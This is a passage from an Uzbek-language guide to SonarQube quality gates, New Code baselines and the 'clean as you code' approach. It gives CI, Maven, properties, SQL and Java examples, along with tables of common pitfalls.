# sonar-project.properties yoki CI dagi -D parametrlari
sonar.projectKey=uz.company:payment-api
sonar.projectName=Payment API

# Gate natijasini kutish: build gate failed bo'lsa yiqiladi
sonar.qualitygate.wait=true
# Kutish chegarasi soniyada; sekin serverda oshirish kerak bo'ladi
sonar.qualitygate.timeout=600

# Coverage hisoboti yo'li (JaCoCo 0.8.x XML hisoboti)
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml

# Generatsiya qilingan kodni analizdan chiqarish
sonar.exclusions=**/generated/**,**/*MapperImpl.java
# Coverage talabidan chiqarish, lekin issue tekshiruvini qoldirish
sonar.coverage.exclusions=**/config/**,**/*Application.java
```

`wait` ni yoqishning narxi bor. Build endi server navbatiga bog'liq bo'ladi. Navbat uzun bo'lsa pipeline kutadi, timeout urilsa build texnik sabab bilan yiqiladi, kod aybsiz bo'lsa ham. Shuning uchun `wait` ni PR pipeline da yoqish, tungi to'liq analizda esa o'chirish ko'pincha to'g'ri yechim.

```yaml
# GitHub Actions: PR da gate ni kutadi, main da esa kutmaydi.
name: build
on: [pull_request, push]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0   # New Code hisoblash uchun to'liq tarix kerak
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - name: Test va coverage
        run: ./mvnw -B clean verify
      - name: Sonar analiz
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        run: >
          ./mvnw -B sonar:sonar
          -Dsonar.qualitygate.wait=${{ github.event_name == 'pull_request' }}
          -Dsonar.qualitygate.timeout=600
```

Maven da plugin versiyasini qo'lda qadab qo'yish kerak. Versiyasiz `sonar:sonar` chaqirish har safar boshqa plugin tortib kelishi mumkin va bu build ni takrorlanmas qiladi.

```xml
<!-- pom.xml: scanner va JaCoCo versiyalari qat'iy qadalgan -->
<build>
  <plugins>
    <plugin>
      <groupId>org.sonarsource.scanner.maven</groupId>
      <artifactId>sonar-maven-plugin</artifactId>
      <version>4.0.0.4121</version>
    </plugin>
    <plugin>
      <groupId>org.jacoco</groupId>
      <artifactId>jacoco-maven-plugin</artifactId>
      <version>0.8.12</version>
      <executions>
        <execution>
          <id>prepare</id>
          <goals><goal>prepare-agent</goal></goals>
        </execution>
        <execution>
          <!-- XML hisobot Sonar uchun majburiy, HTML faqat odam uchun -->
          <id>report</id>
          <phase>verify</phase>
          <goals><goal>report</goal></goals>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```

### 6.7 Gate failed bo'lganda build ni to'xtatish yoki ogohlantirish bilan cheklanish

Ikki siyosat bor va ikkisining ham o'z o'rni bor. Qattiq siyosat: gate failed bo'lsa PR merge qilinmaydi. Yumshoq siyosat: gate failed bo'lsa izoh yoziladi, lekin merge mumkin.

Qattiq siyosatni yoqishdan oldin bitta shart bajarilishi kerak: gate shartlari jamoa bilan kelishilgan va ular New Code ustida turgan bo'lishi kerak. Butun kod ustida qattiq shart bilan legacy loyihaga qattiq gate qo'yish ishni to'xtatadi, chunki birinchi PR muallifi 40 ming qatorlik qarzni to'lashi kerak bo'ladi.

Oraliq yondashuv ancha amaliy. Avval 4 yoki 6 hafta faqat ogohlantirish rejimida ishlatiladi. Shu davrda gate qancha PR ni yiqitgani o'lchanadi. Agar ko'rsatkich sabab bilan tushuntirilsa, siyosat qattiqlashtiriladi.

```sql
-- O'z CI metrikalar bazangizda gate natijalarini kuzatish.
-- Sonar bazasiga to'g'ridan to'g'ri SQL yozish qo'llanmaydi, shuning uchun
-- natija API orqali o'qilib, o'z jadvalingizga yoziladi.
CREATE TABLE ci_quality_gate_run (
    id            BIGSERIAL PRIMARY KEY,
    project_key   TEXT        NOT NULL,
    branch        TEXT        NOT NULL,
    status        TEXT        NOT NULL,   -- OK yoki ERROR
    failed_metric TEXT,                   -- birinchi buzilgan shart metrikasi
    analyzed_at   TIMESTAMPTZ NOT NULL
);

-- So'nggi 30 kunda qaysi shart eng ko'p bloklagan
SELECT failed_metric,
       COUNT(*) AS fail_count
FROM   ci_quality_gate_run
WHERE  status = 'ERROR'
  AND  analyzed_at >= now() - INTERVAL '30 days'
GROUP  BY failed_metric
ORDER  BY fail_count DESC;
```

Bu so'rovning javobi siyosatni tuzatish uchun asos beradi. Agar 90% yiqilish bitta shart sababli bo'lsa, demak o'sha shart noto'g'ri sozlangan yoki jamoada bilim bo'shlig'i bor.

### 6.8 Gate shartlarini tanlash mantiqi: nimani bloklash kerak, nimani kerak emas

Bloklash mezoni oddiy: shart buzilganda muallif nima qilishini bilsa, shart bloklovchi bo'lishi mumkin. Agar muallif "bu raqamni qanday tuzatishni bilmayman" desa, shart bloklamasligi kerak.

Bloklashga munosib bo'lgan narsalar: yangi kodda ishonchlilik va xavfsizlik muammolari, yangi kodda ko'rib chiqilmagan Security Hotspot, yangi kodda juda past coverage, yangi kodda ko'p nusxalangan blok. Bularning hammasi aniq va lokal: muallif o'z diff ida tuzatadi.

Bloklashga yaramaydigan narsalar: butun loyiha coverage i, butun loyiha texnik qarz vaqti, kod qatorlari soni, butun loyiha reytingi. Bular jamoa uchun ko'rsatkich, individual PR uchun jazo emas. Ularni gate ga qo'ysangiz, aybsiz odam jazolanadi.

| Shart | Bloklash | Sabab |
|---|---|---|
| New Code da yangi bug turidagi issue | Ha | Lokal, aniq, muallif tuzatadi |
| New Code coverage 80% dan past | Ha | Diff ga test yozish mumkin |
| New Code duplikatsiya 3% dan ko'p | Ha | Metodga ajratish yetarli |
| Ko'rib chiqilmagan Security Hotspot | Ha | Ko'rib chiqish bir necha daqiqa |
| Butun loyiha coverage 80% dan past | Yo'q | Eski qarz, PR muallifi aybdor emas |
| Butun loyihadagi code smell soni | Yo'q | Cheksiz katta, tuzatish chegarasi yo'q |
| Texnik qarz koeffitsiyenti (overall) | Yo'q | Taxminiy baho, aniq harakat bermaydi |
| Kod qatorlari soni | Yo'q | Sifat bilan bog'liq emas |

### 6.9 Juda qattiq gate ning ta'siri: chetlab o'tish yo'llari va jamoa xatti-harakati

Qattiqlik chegarasidan oshganda jamoa gate ni yengishni boshlaydi, sifatni oshirishni emas. Bu axloqiy muammo emas, tizim dizayni muammosi. Odamlar eng kam qarshilik yo'lidan boradi, va qattiq gate ko'pincha eng kam qarshilikni chetlab o'tishga qo'yadi.

Eng ko'p uchraydigan chetlab o'tish usullari quyidagilar. Birinchisi coverage ni soxta test bilan ko'tarish: metod chaqiriladi, lekin hech qanday assert yo'q. Ikkinchisi `sonar.coverage.exclusions` ga paket qo'shish. Uchinchisi issue ni "Won't fix" yoki "False positive" deb yopish, sababini o'ylab topib. To'rtinchisi kodga `@SuppressWarnings` yoki `// NOSONAR` yozish. Beshinchisi PR ni katta qilish: 10 qatorli PR da coverage shart juda sezgir, 2000 qatorli PR da o'rtacha raqam osonroq chiqadi.

```java
// Yomon kod: coverage ni ko'taradi, xatoni topmaydi.
@Test
void calculateTotal_works() {
    OrderService service = new OrderService(new InMemoryPriceRepo());
    service.calculateTotal(new Order("A-1", List.of(new Item("SKU-1", 2))));
    // Hech qanday assert yo'q: JaCoCo qatorni qoplangan deb belgilaydi,
    // lekin natija xato bo'lsa ham test yashil qoladi.
}

// Sonar o'tadigan va haqiqatan tekshiradigan variant.
@Test
void calculateTotal_appliesQuantityAndRoundsToTwoDecimals() {
    PriceRepo prices = sku -> new BigDecimal("19.99");
    OrderService service = new OrderService(prices);

    BigDecimal total = service.calculateTotal(
            new Order("A-1", List.of(new Item("SKU-1", 2))));

    // 19.99 * 2 = 39.98, yarim yuqoriga yaxlitlash bilan
    assertThat(total).isEqualByComparingTo(new BigDecimal("39.98"));
}
```

Assert siz testni Sonar ham ushlaydi: "test assertion ichida bo'lishi kerak" turidagi qoida mavjud. Lekin bu qoidani chetlab o'tish ham qiyin emas, masalan ma'nosiz `assertNotNull` yozib. Shuning uchun gate ni code review bilan juftlash kerak. Gate raqamni tekshiradi, odam ma'noni tekshiradi. Test sifatining o'zi alohida mavzu va u testlash qo'llanmasidagi test sifati va mutatsion test mavzularida ochiladi.

| Tuzoq | Nimaga olib keladi | Yechim |
|---|---|---|
| Overall coverage ni gate ga qo'yish | Legacy loyihada hamma PR yiqiladi | Faqat New Code coverage shartini qoldirish |
| `wait` ni yoqmaslik | Gate failed bo'lsa ham build yashil | PR pipeline da `sonar.qualitygate.wait=true` |
| `wait` ni yoqib timeout ni oshirmaslik | Navbat uzunda build sababsiz yiqiladi | `sonar.qualitygate.timeout` ni 600 ga ko'tarish |
| `fetch-depth: 1` bilan checkout | New Code chegarasi noto'g'ri, diff katta ko'rinadi | `fetch-depth: 0` va to'g'ri `newCodePeriod` |
| Coverage ni assert siz test bilan ko'tarish | Raqam yaxshi, xato ushlanmaydi | Review da assert talab qilish, mutatsion test |
| `// NOSONAR` ni erkin ishlatish | Qoida o'lik, sabab hech qayerda yozilmagan | `NOSONAR` ni review da sabab bilan talab qilish |
| Keng `coverage.exclusions` | Butun domen qatlami o'lchovdan chiqadi | Exclusion ni faqat DTO va config ga cheklash |
| 100% coverage shartini qo'yish | Trivial test ko'payadi, PR kattalashadi | Chegarani 80 yoki 85 da qoldirish |

Mana so'ralgan taqqoslash: standart shart va 100% ga sozlangan shart bir xil metrikada qanday boshqacha xulq berishini ko'rsatadi.

| Jihat | Standart gate sharti (New Code coverage < 80%) | 100% ga sozlangan gate sharti (New Code coverage < 100%) |
|---|---|---|
| Kichik PR da xulq | 10 qatorda 2 qator qoplanmasa ham o'tadi | Bitta qoplanmagan qator PR ni yiqitadi |
| Getter va DTO | Ularga test yozmaslik mumkin | Yoki test yoziladi, yoki exclusion qo'shiladi |
| Exception yo'llari | Asosiy yo'l qoplansa yetarli | Har bir catch bloki uchun test kerak |
| Jamoa xatti-harakati | Test mazmuniga e'tibor qoladi | Exclusion va assert siz test ko'payadi |
| Review yuklamasi | O'rtacha | Yuqori, chunki soxta testlarni ushlash kerak |
| Haqiqiy xato topish qobiliyati | Barqaror | Oshmaydi, ba'zan tushadi |
| Legacy kodga tegish | Mumkin, qarz sekin to'lanadi | Qo'rqinchli, shuning uchun refactoring to'xtaydi |
| Tavsiya | Standart holat sifatida qoldirish | Faqat kichik va kritik modulda, ongli ravishda |

### 6.10 Gate o'zgarganda tarixiy loyihalarga ta'siri

Gate shartini o'zgartirish retroaktiv emas. Eski analizlarning saqlangan holati qayta yozilmaydi. Lekin loyihaning hozirgi holati keyingi analizda darhol yangi shart bo'yicha baholanadi.

Shuning uchun gate ni qattiqlashtirishning real ta'siri shunday ko'rinadi: o'zgarishdan keyin birinchi PR yuborgan odam yangi shartni birinchi bo'lib yeb qoladi, garchi uning diff i avvalgi kundagidek bo'lsa ham. Bu jamoada adolatsizlik hissi tug'diradi va Sonar ga ishonchni buzadi.

To'g'ri tartib quyidagicha. Avval o'zgarishni e'lon qilish va kuchga kirish sanasini aytish. Keyin yangi shart bilan bir necha loyihada sinov o'tkazish, masalan nusxa gate da. Shundan keyingina real gate ni almashtirish. Va o'zgarishni gate tarixida qayd qilish, chunki metrika grafigidagi keskin sakrashni keyin tushuntirish kerak bo'ladi.

New Code chegarasini o'zgartirish ham shunga o'xshash ta'sir beradi. Agar chegara "oldingi versiya" dan "oxirgi 30 kun" ga ko'chirilsa, New Code hajmi keskin o'zgaradi va coverage foizi ham siljiydi. Kod o'zgarmagan bo'lsa ham gate holati o'zgarishi mumkin.

| Jihat | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Gate tanlash | Built-in `Sonar way` ni shundayligicha qoldirish | Servis sinfiga mos 2-3 gate, har birida sabab yozilgan |
| Shart chegarasi | "Qattiqroq bo'lsa yaxshiroq" deb 100% qo'yish | Chegarani jamoa real bajara oladigan darajada qo'yish |
| Shart doirasi | Overall Code ustiga shart qo'yish | Bloklovchi shartlarni faqat New Code ustida qoldirish |
| CI integratsiyasi | `sonar:sonar` chaqirib natijani o'qimaslik | `wait` va `timeout` ni muhitga qarab sozlash |
| Gate failed bo'lganda | Issue ni "Won't fix" qilib yopish | Sababni tahlil qilish, kod yoki shartni tuzatish |
| Coverage ni ko'tarish | Assert siz test yozib raqamni bo'yash | Xulqni tekshiradigan test, mutatsion test bilan nazorat |
| Exclusion siyosati | Yiqilgan paketni exclusions ga qo'shish | Exclusion ro'yxatini review qilinadigan artefakt deb qarash |
| Gate o'zgarishi | Kechqurun jim o'zgartirish | E'lon, sinov davri, kuchga kirish sanasi, qayd |
| Natijani kuzatish | Faqat UI ga qarash | Gate natijalarini o'z bazasiga yozib trend o'lchash |
| Muvaffaqiyat mezoni | Gate yashil | Production da incident soni va o'rtacha tuzatish vaqti |

### 6.11 Amalda qo'llash

- [ ] Serveringizdagi `Sonar way` gate shartlarini `api/qualitygates/show` orqali eksport qiling va haqiqiy ro'yxatni hujjatlashtirib qo'ying.
- [ ] Gate dagi barcha bloklovchi shartni tekshirib, Overall Code ustida turganlarini New Code ga ko'chiring.
- [ ] PR pipeline ga `sonar.qualitygate.wait=true` va `sonar.qualitygate.timeout=600` qo'shing, main branch da `wait` ni o'chirib qoldiring.
- [ ] CI checkout ini `fetch-depth: 0` ga o'tkazing va New Code chegarasi to'g'ri hisoblanayotganini bitta PR da tekshirib ko'ring.
- [ ] `sonar-maven-plugin` va `jacoco-maven-plugin` versiyalarini `pom.xml` da qat'iy qadab, build takrorlanadigan bo'lishini ta'minlang.
- [ ] Oxirgi 30 kundagi gate yiqilishlarini metrika bo'yicha guruhlab, eng ko'p bloklagan shartni aniqlang va u asoslimi degan savolga javob yozing.
- [ ] `sonar.coverage.exclusions` ro'yxatini qayta ko'rib chiqing va domen yoki servis qatlamiga tegadigan har bir qatorni olib tashlang.
- [ ] Gate ni qattiqlashtirish rejasini e'lon sanasi, sinov davri va kuchga kirish sanasi bilan yozib, jamoaga oldindan tarqating.

## 7. Yangi kod (new code) va "clean as you code" tamoyili (New Code and Clean as You Code)

Sonar hisoblaydigan metrikalarning yarmi "yangi kod" ustida o'lchanadi. Bu bitta sozlama emas, balki butun bir ish uslubi: jamoa eski qarzni to'lamay turib ham sifatni oshira boradi. Lekin yangi kod chegarasi noto'g'ri qo'yilsa yoki git tarixi buzilgan bo'lsa, quality gate kutilmaganda qizil yonadi va hech kim nega qizil ekanini tushunmaydi. Bu bobda yangi kod qanday aniqlanishi, qaysi chegara usuli qaysi reliz jarayoniga mos kelishi va amalda eng ko'p uchraydigan tuzoqlar ko'rib chiqiladi.

### 7.1 Yangi kod nima: ta'rifi va u nega alohida o'lchanadi

Yangi kod deganda Sonar belgilangan chegaradan keyin o'zgargan yoki qo'shilgan kod qatorlarini tushunadi. Sonar buni fayl darajasida emas, qator darajasida hisoblaydi. Har bir qator uchun SCM blame ma'lumotidan oxirgi o'zgartirish sanasi va commit identifikatori olinadi. Agar shu sana chegaradan keyin bo'lsa, qator yangi kod to'plamiga kiradi.

Shundan keyin Sonar alohida metrikalar to'plamini hisoblaydi. Ular `new_` prefiksi bilan boshlanadi: yangi kodda qoplanganlik, yangi issue soni, yangi kodda takrorlangan qatorlar ulushi, yangi kodda qoplanishi kerak bo'lgan qatorlar soni. Bu metrikalar umumiy metrikalardan mustaqil.

Nega alohida o'lchanadi: umumiy metrikalar eski kodning massasi tufayli deyarli qimirlamaydi. Yetti yillik loyihada 200 ming qator bor va qoplanganlik 24 foiz bo'lsa, bitta sprintda yozilgan 800 qator mukammal test bilan ham umumiy raqamni 25 foizga ko'tarmaydi. Jamoa harakat qiladi, tablo o'zgarmaydi, metrikaga ishonch yo'qoladi.

Yangi kod metrikasi esa darhol javob beradi va shu sprintda yozilgan kodning sifatini ko'rsatadi. Bu mas'uliyat taqsimotiga ham to'g'ri keladi: pull request muallifi o'zi yozgan kod uchun javob beradi, 2019 yilda ketgan hamkasbining kodi uchun emas.

### 7.2 Yangi kod chegarasini belgilash usullari

Sonar bir nechta usulni taklif qiladi. Nomlanishi SonarQube versiyasiga qarab farq qiladi, lekin mohiyati bir xil qoladi. Eski liniyalarda bu "leak period" deb atalgan va `sonar.leak.period` xossasi bilan sozlangan. 9.9 LTA va 2025 LTA liniyalarida sozlama loyiha sozlamalarining "New Code" bo'limida turadi va global standart qiymat ham bor.

Birinchi usul: oldingi versiya. Sonar `sonar.projectVersion` qiymatining oxirgi o'zgarishini chegara deb oladi. Versiya `1.4.0` dan `1.5.0` ga o'tganda chegara avtomatik suriladi.

Ikkinchi usul: aniq sanadan boshlab. Chegara qo'lda qo'yilgan kalendar sanaga mixlanadi. Shu sanadan keyingi hamma narsa abadiy yangi kod bo'lib qoladi.

Uchinchi usul: kun soni. Suriluvchi oyna, masalan oxirgi 30 kun. Har kuni chegara bir kun oldinga suriladi.

To'rtinchi usul: aniq versiya yoki aniq tahlil. Siz ro'yxatdan bitta tahlilni tanlab, uni baseline qilib mixlaysiz. Bu "modernizatsiya shu nuqtadan boshlandi" degan ma'noni beradi.

Beshinchi usul, branch uchun eng muhimi: reference branch. Branchdagi yangi kod `main` bilan solishtirilib aniqlanadi. Bu `sonar.newCode.referenceBranch` xossasi bilan ham beriladi.

| Usul | Chegara qanday suriladi | Kuchli tomoni | Zaif tomoni | Kimga mos |
|---|---|---|---|---|
| Oldingi versiya | `sonar.projectVersion` o'zgarganda | Reliz bilan tabiiy mos | Versiya qo'lda o'zgarmasa chegara muzlaydi | Semantik versiyalangan kutubxona va servis |
| Aniq sana | Hech qachon, qo'lda o'zgartiriladi | Modernizatsiya boshlanishi aniq qolar | Vaqt o'tib yangi kod massasi o'sib ketadi | Qisqa muddatli tozalash kampaniyasi |
| Kun soni | Har kuni avtomatik | Sozlashni talab qilmaydi | Oyna ichidan chiqqan issue tabloni tark etadi | Tez-tez deploy qiladigan jamoa |
| Aniq tahlil / versiya | Faqat qo'lda | Baseline butunlay nazoratda | Unutilsa yillar davomida eskiradi | Legacy audit va shartnomaviy baseline |
| Reference branch | Har PR uchun avtomatik, diff asosida | PR uchun eng aniq natija | To'liq git tarixi majburiy | Trunk based va GitFlow jamoalari |

### 7.3 Qaysi usul qaysi reliz jarayoniga mos keladi

Agar siz har sprint oxirida versiya chiqarsangiz va Maven versiyasi haqiqatda o'zgarsa, "oldingi versiya" eng toza variant. Yangi kod "oxirgi relizdan keyin yozilgani" degan ma'noni oladi va buni biznes ham tushunadi. Shart: build versiyani Sonarga uzatishi kerak.

```xml
<!-- pom.xml: Sonar loyiha versiyasini Maven versiyasiga bog'lab qo'yamiz -->
<!-- shunda "oldingi versiya" chegarasi reliz bilan birga suriladi -->
<properties>
  <sonar.projectKey>warehouse-service</sonar.projectKey>
  <sonar.projectVersion>${project.version}</sonar.projectVersion>
  <!-- blame ishlashi uchun SCM provayderi aniq ko'rsatiladi -->
  <sonar.scm.provider>git</sonar.scm.provider>
  <!-- generatsiya qilingan kod yangi kodni shishirmasligi uchun chiqarib tashlanadi -->
  <sonar.exclusions>**/generated/**,**/*MapperImpl.java</sonar.exclusions>
  <sonar.coverage.exclusions>**/config/**,**/dto/**</sonar.coverage.exclusions>
</properties>
```

Agar siz kuniga bir necha marta deploy qilsangiz va versiya tushunchasi amalda yo'q bo'lsa, "kun soni" qulay. 30 kun ko'pchilik jamoa uchun muvozanatli. 7 kun juda qisqa, chunki ta'tilga ketgan odamning kodi tabloni tark etadi. 90 kun juda uzun, chunki chorak oxirida gate ostidagi qarz to'planib qoladi.

Uzoq yashaydigan `develop` branchi va reliz branchlari bo'lsa, reference branch eng aniq natija beradi. Bunda feature branch `develop` bilan, reliz branchi `main` bilan solishtiriladi. Monorepoda esa global standart qiymatga tayanmang. Har modulning reliz ritmi boshqacha, shuning uchun sozlama loyiha darajasida qo'yiladi.

Legacy modernizatsiya loyihasida "aniq tahlil" usuli ishlatiladi: birinchi tahlil baseline qilinadi va kelishuv shunday bo'ladi, bu nuqtadan keyingi hamma kod toza. Lekin kalendarga eslatma qo'ying, chunki ikki yildan keyin bu baseline ma'nosini yo'qotadi.

### 7.4 "Clean as you code" tamoyili: eski qarzni to'lamay turib oldinga siljish

"Clean as you code" uchta oddiy qoidadan iborat. Birinchi: tegmagan kodni tozalamaysiz. Ikkinchi: tekkan kodni standartga keltirasiz. Uchinchi: quality gate faqat yangi kodni ushlaydi.

Bu tamoyil iqtisodiy mantiqqa asoslanadi. Yillar davomida o'zgarmaydigan kod issue'li bo'lsa ham xarajat keltirmaydi. O'zgarayotgan qism esa o'zi haqida signal beradi: u yerda bug paydo bo'ladi va vaqt ketadi. Clean as you code aynan shu qizigan joylarni tozalaydi.

Misol: `PaymentService` 900 qator, cognitive complexity osmonda, qoplanganlik 11 foiz. Sizga refund funksiyasi kerak. Yomon yondashuv: butun klassni qayta yozish, 900 qatorli PR, hech kim review qilmaydi. To'g'ri yondashuv: refund logikasini alohida, test bilan qoplangan klassga chiqarish va unga delegatsiya qilish.

```java
// Yomon: yangi logika eski 900 qatorli klass ichiga tiqiladi.
// Sonar java:S3776 (cognitive complexity) bo'yicha shikoyat qiladi,
// chunki o'zgargan metod yangi kod sifatida qayta o'lchanadi.
public void process(Order order) {
    if (order.getType() == OrderType.REFUND) {
        if (order.getAmount().compareTo(BigDecimal.ZERO) > 0) {
            if (order.getPayment() != null) {
                if (order.getPayment().isSettled()) {
                    // ... yana besh qatlam ichma-ich shart
                }
            }
        }
    }
}
```

```java
// Sonar o'tadigan variant: yangi logika alohida klassda,
// complexity past, har bir tarmoq test bilan qoplanadi.
@Service
class RefundProcessor {

    private static final String NOT_SETTLED = "To'lov hali yakunlanmagan";

    RefundResult refund(Payment payment, BigDecimal amount) {
        // qo'riqchi shartlar: ichma-ich if o'rniga erta qaytish
        if (!payment.isSettled()) {
            return RefundResult.rejected(NOT_SETTLED);
        }
        if (amount.compareTo(payment.amount()) > 0) {
            return RefundResult.rejected("Summa to'lovdan katta");
        }
        return RefundResult.accepted(amount);
    }
}
```

Eski `process` metodiga faqat bitta delegatsiya qatori qo'shiladi. Yangi kod to'plami kichik, toza va to'liq qoplangan. Eski 900 qator o'z holida qoladi va gate'ni qizartirmaydi.

### 7.5 Yangi kod ustidagi shartlar va umumiy kod ustidagi shartlar farqi

Sonar'ning standart gate'i (Sonar way) faqat yangi kod shartlaridan tuzilgan. Bu tasodif emas, bu mahsulot falsafasi. Umumiy kod ustiga shart qo'yish texnik jihatdan mumkin, lekin ko'p hollarda bu xato.

Tasavvur qiling, umumiy qoplanganlik uchun 80 foiz sharti qo'yildi, hozirgi qiymat 22 foiz. Gate birinchi kundan qizil va yillar davomida qizil qoladi. Jamoa gate'ni o'chiradi yoki uni e'tiborsiz qoldiradi. Ikkinchisi yomonroq, chunki haqiqiy yangi muammo shu qizil fonda ko'rinmay ketadi.

Yangi kod shartlari esa bajarilishi mumkin. Yangi kodda 80 foiz qoplanganlik, yangi kodda yuqori og'irlikdagi issue bo'lmasligi, yangi kodda takrorlanish 3 foizdan oshmasligi: bularning hammasi bitta PR ichida hal qilinadi.

Umumiy metrikani butunlay tashlab yubormang. Uni gate shartiga emas, kuzatuv ko'rsatkichiga aylantiring. Bu haqda oxirgi bo'limda gaplashamiz.

| Savol | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Chegara usuli | Global standartni o'zgartirmaydi | Har loyihaning reliz ritmiga qarab tanlanadi |
| Umumiy coverage | Gate shartiga qo'yiladi, gate abadiy qizil | Trend sifatida kuzatiladi, gate yangi kodda |
| Legacy qarz | "Keling, hammasini tozalaymiz" sprinti rejalanadi | Tegilgan joy tozalanadi, qolgani kuzatuvda |
| Formatlash | Spotless butun repoga bir marta qo'llanadi | Alohida commitda, blame-ignore ro'yxati bilan |
| Fayl ko'chirish | Ko'chirish, formatlash, logika bitta commitda | Uch alohida commit, har biri tekshiriladi |
| CI klon | `fetch-depth: 1`, tez bo'lsin deb | `fetch-depth: 0`, blame to'g'ri bo'lsin deb |
| Yangi kod coverage talabi | 100 foiz, "sifat shunday bo'ladi" | 80 foiz, ustiga assertion sifati review'da |
| Kichik PR gate'da yiqilsa | Shart o'chiriladi yoki issue "won't fix" qilinadi | Istisno jurnalga yozilib, sababi bilan tasdiqlanadi |
| Generatsiya qilingan kod | Tahlilda qoladi va yangi kodni shishiradi | `sonar.exclusions` bilan chiqariladi |
| Baseline | Bir marta qo'yilib unutiladi | Chorakda qayta ko'rib chiqiladi |

### 7.6 Pull request tahlilida yangi kod qanday aniqlanadi

PR tahlilida Sonar loyihaning New Code sozlamasini ishlatmaydi. U PR diff'iga tayanadi. Aniqrog'i, PR branchi va base branch orasidagi merge base topiladi va shundan keyingi o'zgarishlar yangi kod deb olinadi. Shuning uchun PR tahlili uchun to'liq git tarixi majburiy.

Scanner'ga uchta xossa kerak: PR kaliti, PR branchi nomi va base branch nomi. CI integratsiyasi (GitHub Actions, GitLab CI, Bitbucket) ko'p hollarda bularni avtomatik aniqlaydi, lekin aniqlamagan holda qo'lda beriladi.

```yaml
# .github/workflows/sonar.yml
name: sonar
on: [pull_request]
jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          # 0 degani to'liq tarix: blame va merge base shunda ishlaydi
          fetch-depth: 0
      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: temurin
      # test va JaCoCo hisoboti bitta buildda tayyorlanadi
      - name: Build va tahlil
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: >
          ./mvnw -B verify
          org.sonarsource.scanner.maven:sonar-maven-plugin:sonar
          -Dsonar.host.url=${{ vars.SONAR_HOST_URL }}
          -Dsonar.pullrequest.key=${{ github.event.number }}
          -Dsonar.pullrequest.branch=${{ github.head_ref }}
          -Dsonar.pullrequest.base=${{ github.base_ref }}
```

Yana bir muhim nuqta: PR tahlilida qoplanganlik shu buildda ishlab chiqilgan JaCoCo hisobotidan olinadi. Agar testlar o'tkazib yuborilsa yoki `jacoco.exec` fayli yo'q bo'lsa, yangi kod qoplanganligi 0 foiz chiqadi va gate yiqiladi. Bu Sonar xatosi emas, bu build tartibi xatosi.

```properties
# sonar-project.properties: Maven ishlatilmaydigan loyihalar uchun
sonar.projectKey=order-api
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
# JaCoCo XML hisoboti yo'li aniq ko'rsatiladi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
# branch tahlili uchun taqqoslash nuqtasi
sonar.newCode.referenceBranch=main
sonar.scm.provider=git
sonar.scm.forceReloadAll=false
```

### 7.7 Faylni ko'chirish, formatlash va refaktoring yangi kodni qanday shishiradi

Yangi kod blame sanasiga tayanadi, blame sanasi esa qatorning oxirgi o'zgarishiga qaraydi. Formatlash o'zgarishi ham o'zgarish hisoblanadi.

Agar siz Spotless yoki IDE formatlashini butun repoga bir marta qo'llasangiz, yuz minglab qator yangi blame sanasini oladi. Keyingi tahlilda yangi kod hajmi 200 ming qatorga chiqadi, qoplanganlik 20 foizga tushadi va gate qizil yonadi. Kod mazmunan bir zarra ham o'zgarmagan.

Fayl ko'chirish ham xuddi shunday xatarli. Git faylni ko'chirishni o'zi aniqlaydi, lekin faqat mazmun yetarlicha o'xshash bo'lsa. Faylni ko'chirib, shu commitda uni formatlab va ustiga logikani o'zgartirsangiz, git o'xshashlikni topolmaydi. Natijada butun fayl yangi fayl sifatida ko'rinadi.

Shuning uchun qoida oddiy: bitta commit bitta turdagi ishni qiladi. Avval ko'chirish commiti, keyin formatlash commiti, keyin logika commiti.

Flyway migratsiyalariga ham qaytib tegmang, chunki har tegish ularni yangi kodga qaytaradi.

```sql
-- V37__add_refund_table.sql
-- Yangi migratsiya: bu fayl yangi kod sifatida tahlil qilinadi.
-- Eski migratsiyalarni formatlash uchun ham qayta ochmang.
CREATE TABLE refund (
    id          BIGSERIAL PRIMARY KEY,
    payment_id  BIGINT        NOT NULL REFERENCES payment (id),
    amount      NUMERIC(19, 4) NOT NULL CHECK (amount > 0),
    status      VARCHAR(32)   NOT NULL,
    created_at  TIMESTAMPTZ   NOT NULL DEFAULT now()
);

-- qidiruv ko'p ishlatiladigan ustun bo'yicha indeks
CREATE INDEX idx_refund_payment ON refund (payment_id);
```

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| Butun repoga formatlash bitta commitda | Hamma qator yangi kodga aylanadi, coverage quladi | Alohida commit, `.git-blame-ignore-revs` ga qo'shish |
| Ko'chirish va o'zgartirish bitta commitda | Git ko'chirishni aniqlamaydi, fayl to'liq yangi | Avval faqat `git mv` commiti, keyin logika |
| CI da `fetch-depth: 1` | Blame yo'q, yangi kod noto'g'ri hisoblanadi | `fetch-depth: 0` qilib qo'yish |
| Generatsiya qilingan kod tahlilda | Yangi kod shishadi, soxta issue oqimi | `sonar.exclusions` ga qo'shish |
| JaCoCo hisoboti buildda yo'q | Yangi kodda 0 foiz coverage, gate qizil | `verify` fazasidan keyin tahlil qilish |
| Kichik bugfix PR | Bitta qoplanmagan qator 0 foiz beradi | Absolut shart yoki tasdiqlangan istisno |
| Satr oxiri (CRLF/LF) o'zgarishi | Butun fayl o'zgargan ko'rinadi | `.gitattributes` bilan normalizatsiya |
| Baseline unutilgan | Ikki yillik kod "yangi" bo'lib qoladi | Chorakda New Code sozlamasini ko'rib chiqish |

### 7.8 Blame ma'lumoti buzilganda nima bo'ladi va uni qanday tuzatish

Blame buzilishining uchta asosiy sababi bor. Sayoz klon: CI `--depth 1` bilan klon qiladi va tarix yo'q. `.git` katalogi tahlil bosqichida mavjud emas, masalan artefakt boshqa job'ga ko'chirilganda. Loyiha boshqa VCS'dan import qilingan va butun tarix bitta "initial import" commitida.

